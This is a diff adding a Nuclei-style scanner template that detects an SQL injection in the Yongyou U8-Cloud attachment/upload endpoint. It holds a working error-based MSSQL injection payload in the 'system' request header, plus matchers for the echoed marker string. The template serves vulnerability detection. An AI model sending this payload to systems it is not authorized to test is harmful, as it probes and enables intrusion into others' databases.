@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-u8-cloud-upload-sqli
+info:
+  name: Yongyou U8-Cloud SQL Injection in attachment/upload Endpoint
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        GET /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
+        Host: {{Hostname}}
+        system: -1' or 1=(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(119)+CHAR(122)+CHAR(120)+CHAR(122)+CHAR(119)+CHAR(122)+CHAR(120)+CHAR(121)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113))--+
+        Content-Type: application/json
+
+        {"credential":"xadmin","password":"o2"}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "qxzwzxzwzxyxzpq"
+          - "Conversion failed"
+      - type: regex
+        negative: true
+        regex:
+          - "<"
+      - type: status
+        status:
+          - 200
